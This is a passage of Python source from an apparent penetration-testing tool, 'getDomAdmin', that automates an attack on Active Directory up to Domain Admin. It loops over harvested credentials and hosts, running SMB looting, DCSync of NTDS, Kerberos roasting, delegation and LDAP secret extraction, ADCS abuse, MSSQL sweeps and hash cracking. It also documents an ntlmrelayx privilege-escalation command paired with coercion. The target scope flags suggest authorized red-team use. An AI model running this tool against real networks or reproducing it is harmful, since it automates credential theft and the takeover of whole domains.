    listener/interface; this launches the listener and fires coercion, then the
    operator harvests relayed secrets from ntlmrelayx output."""
    if not ENABLE_RELAY or not kb.tools.get("ntlmrelayx"):
        return
    kb.log.warn("RELAY campaign armed (GETDA_ENABLE_RELAY=1). This is disruptive; ensure your listener interface is correct.")
    kb.findings.append("relay: ntlmrelayx campaign requested — coordinate a listener + coerce_plus trigger (see log/docs)")
    # Intentionally not auto-fired unattended in the fixpoint loop: relays are stateful
    # and need an interface + target selection. The dependency + invocation are documented
    # so the operator can run: ntlmrelayx.py -t ldap://<DC> --escalate-user <user> -smb2support
    # alongside `nxc smb <coerce_target> -M coerce_plus`.


# --------------------------------------------------------------------------- #
# the decision tree for one (credential, target) state
# --------------------------------------------------------------------------- #
def process_state(kb, root, cred, target):
    """Apply the full decision tree to one (credential, target). Each technique is
    gated by the spanning-tree visit() so it runs once per meaningful scope, but a
    newly-discovered credential creates fresh states that re-enter this tree."""
    try:
        host = root if target == root.target else root.at(target)
    except (Exception, SystemExit) as exc:  # noqa: BLE001
        kb.log.exception(f"cannot select target {target} (outside --allow-target?)", exc)
        return

    ident = "anon" if cred is None else cred.label()
    kb.log.step(f"STATE: {ident} -> {target}")

    # ---- SMB (always attempted) ----------------------------------------- #
    if kb.visit((cred.key() if cred else "anon", target), "smb"):
        smb = open_session(kb, host, "smb", cred)
        if smb is not None:
            is_admin = bool(getattr(smb, "admin", False))
            is_dc = bool(kb.hosts.get(target, {}).get("dc"))
            if kb.visit((cred.key() if cred else "anon", target), "smb-enum"):
                smb_enumerate(kb, host, cred, smb)
            if is_admin and kb.visit((cred.key() if cred else "anon", target), "smb-loot"):
                smb_loot_admin(kb, host, cred, smb)
            if is_dc and (is_admin or (cred and not cred.local)) and kb.visit((cred.key() if cred else "anon", target), "ntds"):
                smb_dcsync(kb, host, cred, smb)
            sync_db(kb, smb, "smb")

    # ---- LDAP (domain-wide; run once per credential, preferably at a DC) - #
    want_ldap = kb.hosts.get(target, {}).get("dc") or target == root.target
    if cred is not None and want_ldap and kb.visit((cred.key(), kb.default_domain or target), "ldap"):
        ldap = open_session(kb, host, "ldap", cred)
        if ldap is not None:
            ldap_enumerate(kb, host, cred, ldap)
            ldap_roast(kb, host, cred, ldap)
            ldap_delegation(kb, host, cred, ldap)
            ldap_secrets(kb, host, cred, ldap)
            ldap_bloodhound(kb, host, cred, ldap)
            sync_db(kb, ldap, "ldap")
        adcs_campaign(kb, host, cred)

    # anonymous LDAP (null bind) once per target as well
    if cred is None and want_ldap and kb.visit(("anon", target), "ldap-anon"):
        ldap = open_session(kb, host, "ldap", None)
        if ldap is not None:
            ldap_enumerate(kb, host, cred, ldap)
            ldap_secrets(kb, host, cred, ldap)
            sync_db(kb, ldap, "ldap")

    # ---- MSSQL (credentialed) ------------------------------------------- #
    if cred is not None and kb.visit((cred.key(), target), "mssql"):
        sql = open_session(kb, host, "mssql", cred)
        if sql is not None:
            mssql_sweep(kb, host, cred, sql)
            sync_db(kb, sql, "mssql")

    # ---- crack whatever we have captured so far (feeds new plaintext) ---- #
    crack_hashes(kb)

    if ENABLE_RELAY:
        relay_campaign(kb, host)


# --------------------------------------------------------------------------- #
# seeding and host discovery
# --------------------------------------------------------------------------- #
def seed_credentials(kb, root):
    """Read the credential the playbook was launched with off a live session, so
    the seed is a first-class node that can be reused against every allowed host."""
    for proto in ("smb", "ldap"):
        try:
            session = getattr(root, proto)()
        except (Exception, SystemExit) as exc:  # noqa: BLE001
            kb.log.exception(f"seed {proto} session", exc)
            continue
        conn = getattr(session, "connection", None)
        if conn is None or not getattr(session, "ok", False):
            continue
        user = getattr(conn, "username", "") or ""
        if not user:
            kb.log.info(f"{proto}: no seed credential (anonymous start)")
            continue
        domain = getattr(conn, "domain", "") or kb.default_domain
        pw = getattr(conn, "password", "") or ""
        nthash = getattr(conn, "nthash", "") or ""
        if pw:
            kb.add_cred(Cred(domain, user, pw, "plaintext", source="seed"))
        elif nthash:
            kb.add_cred(Cred(domain, user, f":{nthash}", "hash", source="seed"))
        sync_db(kb, session, proto)
        return
    kb.log.warn("no usable seed credential — starting fully unauthenticated (null/anon)")


def discover_hosts(kb, root):
    """Expand --allow-target into the concrete host set we may traverse."""
    scope = list(getattr(root.workflow, "allowed_targets", []) or [root.target])
    for target in scope:
        kb.allowed.add(target)
        kb.add_host(target)
    kb.log.info(f"allowed traversal scope ({len(kb.allowed)} host(s)): {', '.join(sorted(kb.allowed))}")


# --------------------------------------------------------------------------- #
# reporting
# --------------------------------------------------------------------------- #
def build_report(kb, target):
    creds = [{"identity": c.label(), "kind": c.kind, "local": c.local, "source": c.source} for c in kb.creds.values()]
    hosts = [{"host": h, **{k: v for k, v in facts.items()}} for h, facts in kb.hosts.items()]
    edges = [f"adminTo user#{u} -> host#{h}" for (u, h) in kb.admin_edges if isinstance(u, int)]
    return DAReport(
        target=target, da_reached=kb.da_reached, da_proof=kb.da_proof,
        credentials=creds, hosts=hosts, admin_edges=edges, findings=kb.findings,
        steps=kb.steps, log_file=kb.log.base + ".log",
    )


def print_summary(kb, target):
    out = ["", "=" * 78, f" getDomAdmin — {target}", "=" * 78,
           f" Domain Admin reached : {'YES — ' + kb.da_proof if kb.da_reached else 'no (saturated / budget)'}",
           f" credentials harvested: {len(kb.creds)}",
           f" hosts touched        : {len(kb.hosts)}",
           f" technique executions : {kb.steps}",
           f" captured hash files  : {len(kb.roast_files)}",
           f" full log             : {kb.log.base}.log",
           "-" * 78, " CREDENTIALS:"]
    for c in kb.creds.values():
        out.append(f"   - {c.label():<48} via {c.source}")
    if kb.findings:
        out.append(" NOTABLE FINDINGS / EDGES:")
        out.extend(f"   - {f}" for f in kb.findings[:60])
        if len(kb.findings) > 60:
            out.append(f"   … (+{len(kb.findings) - 60} more in the log)")
    out.append("=" * 78)
    print("\n".join(out))


# --------------------------------------------------------------------------- #
# entry point — the fixpoint loop
# --------------------------------------------------------------------------- #
def run(host):
    host.defaults(stop_on_error=False)
    log = Log(host.target)
    kb = KB(log=log, default_domain=_resolve_domain(host), dns_server=_resolve_dns(host))
    log.step(f"getDomAdmin start — seed target {host.target}, domain '{kb.default_domain or '?'}', dns '{kb.dns_server or '?'}'")
    log.info(f"budgets: max_steps={MAX_STEPS} max_rounds={MAX_ROUNDS} probe_timeout={PROBE_TIMEOUT}s "
             f"stop_on_da={STOP_ON_DA} adcs={ENABLE_ADCS} loot={ENABLE_LOOT} relay={ENABLE_RELAY} poison={ENABLE_POISON}")

    try:
        preflight_tools(kb)
        discover_hosts(kb, host)
        seed_credentials(kb, host)

        # always probe every allowed host anonymously first (null/guest reach-map)
        for target in sorted(kb.allowed):
            kb.enqueue(None, target)

        rounds = 0
        while kb.worklist and kb.steps < MAX_STEPS and rounds < MAX_ROUNDS:
            rounds += 1
            batch = kb.worklist
            kb.worklist = []
            log.step(f"==== fixpoint round {rounds}: {len(batch)} state(s) queued, "
                     f"{len(kb.creds)} creds known, {kb.steps} steps so far ====")
            for cred, target in batch:
                if kb.steps >= MAX_STEPS:
                    log.warn("step budget reached — stopping traversal")
                    break
                process_state(kb, host, cred, target)
                if kb.da_reached and STOP_ON_DA:
                    log.crit("Domain Admin proven and GETDA_STOP_ON_DA=1 — stopping early")
                    kb.worklist = []
                    break
            # one more crack pass per round in case new hashes arrived mid-round
            crack_hashes(kb)

        if not kb.worklist:
            log.good(f"fixpoint reached (saturation) after {rounds} round(s): no new state to explore")
        else:
            log.warn(f"stopped on budget after {rounds} round(s) with {len(kb.worklist)} state(s) still queued")
    except (Exception, SystemExit) as exc:  # noqa: BLE001 - the loop must always report
        kb.log.exception("fatal error in getDomAdmin main loop", exc)
    finally:
        print_summary(kb, host.target)
        report = build_report(kb, host.target)
        log.step(f"done — {len(kb.creds)} credential(s), DA={'yes' if kb.da_reached else 'no'}; log at {kb.log.base}.log")
        log.close()

    return host.finding("getDomAdmin", ok=kb.da_reached or bool(kb.creds), data=report,
                        inputs={"domain": kb.default_domain, "hosts": sorted(kb.allowed),
                                "credentials": len(kb.creds), "da_reached": kb.da_reached})


def _resolve_domain(host):
    return (host.connection_defaults.get("domain") or "") if getattr(host, "connection_defaults", None) else ""


def _resolve_dns(host):
    return (host.connection_defaults.get("dns_server") or "") if getattr(host, "connection_defaults", None) else ""
